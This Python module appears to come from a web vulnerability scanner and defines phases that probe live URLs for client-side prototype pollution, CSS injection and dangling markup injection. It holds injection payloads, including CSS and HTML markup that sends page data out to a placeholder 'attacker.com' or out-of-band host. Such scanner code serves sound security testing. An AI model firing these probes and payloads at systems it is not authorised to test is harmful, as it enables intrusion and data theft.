"""Client-side vulnerability phases v2: prototype pollution, CSS injection, dangling markup."""

import asyncio
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List

from vulnforge.phases.helpers import (
    _SKIP_PARAMS,
    PhaseSet,
    _is_static_url,
)
from vulnforge.process import _PIPELINE_CFG
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _extra_headers_dict,
    _get_urlopener,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    read_lines,
)


async def phase_170_CLIENTPP(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"170-CLIENTPP"}:
        return {}
    _out = outdir / "client_pp.txt"
    if _out.exists() and not force:
        return {"170-CLIENTPP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 170-CLIENTPP: Client-Side Prototype Pollution")
    findings: List[str] = []
    _pp_urlopen = _get_urlopener()
    _pp_extra_headers = _extra_headers_dict()
    urls_src: str = prev.get("urls") or str(outdir / "urls_all.txt")
    urls_file = Path(urls_src)
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "170-CLIENTPP: no URLs; skipping")
        return {"170-CLIENTPP": str(_out), "count": 0}
    # Payloads for prototype pollution
    pp_payloads = [
        ("__proto__[test]", "true"),
        ("__proto__[polluted]", "true"),
        ("constructor[prototype][test]", "true"),
        ("constructor[prototype][polluted]", "true"),
    ]
    pp_indicators = ["__proto__", "[object Object]", "constructor.prototype"]

    async def _probe_pp(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for param, val in pp_payloads:
            await _throttle_rate()
            test_qs = qs.copy()
            test_qs[param] = [val]
            new_qs = urllib.parse.urlencode(test_qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
            try:
                req = urllib.request.Request(
                    test_url,
                    method="GET",
                    headers={"User-Agent": "Mozilla/5.0", **_pp_extra_headers},
                )
                _, _, resp_body = await _async_urlopen(_pp_urlopen, req, timeout=10)
                body_text = resp_body.decode("utf-8", errors="ignore")
                if param in body_text or val in body_text:
                    results.append(
                        f"[pp-reflection] {test_url} — {param}={val} reflected in response"
                    )
                if any(ind in body_text for ind in pp_indicators):
                    results.append(
                        f"[pp-candidate] {test_url} — prototype pollution indicator in response"
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        # Check for known JS PP sinks in response body
        try:
            req = urllib.request.Request(
                url,
                method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_pp_extra_headers},
            )
            _, _, body = await _async_urlopen(_pp_urlopen, req, timeout=10)
            body_text = body.decode("utf-8", errors="ignore")
            pp_sinks = [
                "$.extend",
                "lodash.merge",
                "_.merge",
                "Vue.set",
                "angular.merge",
                "jQuery.extend",
            ]
            for sink in pp_sinks:
                if sink in body_text:
                    results.append(
                        f"[pp-sink] {url} — known prototype pollution sink detected: {sink}"
                    )
                    break
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        return results

    targets = [u for u in all_urls if "=" in u][: _PIPELINE_CFG.sample_urls_lfi]
    probe_results = await asyncio.gather(*[_probe_pp(u) for u in targets])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[result] No prototype pollution candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"170-CLIENTPP: {len(findings)} probes → {out}")
    return {"170-CLIENTPP": str(out), "count": len(findings)}


async def phase_171_CSSINJECT(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"171-CSSINJECT"}:
        return {}
    _out = outdir / "css_inject.txt"
    if _out.exists() and not force:
        return {"171-CSSINJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 171-CSSINJECT: CSS Injection detection")
    findings: List[str] = []
    _css_urlopen = _get_urlopener()
    _css_extra_headers = _extra_headers_dict()
    oast_domain = prev.get("oast_domain", "") if isinstance(prev, dict) else ""
    urls_src: str = prev.get("urls") or str(outdir / "urls_all.txt")
    urls_file = Path(urls_src)
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "171-CSSINJECT: no URLs; skipping")
        return {"171-CSSINJECT": str(_out), "count": 0}
    css_payloads = [
        "</style><img src=x>",
        "{background:url(http://oast)}",
        "input[value^=a]{background:url(oast)}",
    ]
    # Replace oast placeholder with actual domain if available
    if oast_domain:
        css_payloads = [p.replace("oast", oast_domain) for p in css_payloads]

    async def _probe_css(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in css_payloads:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_css_extra_headers},
                    )
                    _, _, resp_body = await _async_urlopen(_css_urlopen, req, timeout=10)
                    body_text = resp_body.decode("utf-8", errors="ignore")
                    # Check for payload reflection inside <style> or style= context
                    stripped_payload = payload.replace("</style>", "").replace(
                        "<img src=x>", "<img src=x"
                    )
                    if stripped_payload in body_text:
                        results.append(
                            f"[css-inject] {test_url} via {param_name} — payload reflected: {payload[:60]}"
                        )
                    if "</style>" in payload and "</style>" in body_text:
                        results.append(
                            f"[css-inject-style-close] {test_url} via {param_name} — style tag closed"
                        )
                    if oast_domain and oast_domain in body_text:
                        results.append(
                            f"[css-inject-oast] {test_url} via {param_name} — OAST domain reflected"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        return results

    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_lfi
    ]
    probe_results = await asyncio.gather(*[_probe_css(u) for u in param_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[result] No CSS injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"171-CSSINJECT: {len(findings)} probes → {out}")
    return {"171-CSSINJECT": str(out), "count": len(findings)}


async def phase_172_DANGLING(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"172-DANGLING"}:
        return {}
    _out = outdir / "dangling_markup.txt"
    if _out.exists() and not force:
        return {"172-DANGLING": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 172-DANGLING: Dangling Markup Injection")
    findings: List[str] = []
    _dm_urlopen = _get_urlopener()
    _dm_extra_headers = _extra_headers_dict()
    oast_domain = prev.get("oast_domain", "") if isinstance(prev, dict) else ""
    attacker_host = oast_domain or "attacker.com"
    urls_src: str = prev.get("urls") or str(outdir / "urls_all.txt")
    urls_file = Path(urls_src)
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "172-DANGLING: no URLs; skipping")
        return {"172-DANGLING": str(_out), "count": 0}
    dangling_payloads = [
        f'<img src="//{attacker_host}/',
        f'<form action="//{attacker_host}"><button>Submit</button></form>',
        f'<a href="//{attacker_host}">Click here</a>',
    ]

    async def _probe_dangling(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in dangling_payloads:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(
                        test_url,
                        method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_dm_extra_headers},
                    )
                    _, _, resp_body = await _async_urlopen(_dm_urlopen, req, timeout=10)
                    body_text = resp_body.decode("utf-8", errors="ignore")
                    if attacker_host in body_text and any(
                        kw in body_text
                        for kw in ["<img", "<form", "<a ", "href=", "action=", "src="]
                    ):
                        results.append(
                            f"[dangling-markup] {test_url} via {param_name} — markup reflected: {payload[:80]}"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        return results

    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][
        : _PIPELINE_CFG.sample_urls_lfi
    ]
    probe_results = await asyncio.gather(*[_probe_dangling(u) for u in param_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[result] No dangling markup injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"172-DANGLING: {len(findings)} probes → {out}")
    return {"172-DANGLING": str(out), "count": len(findings)}
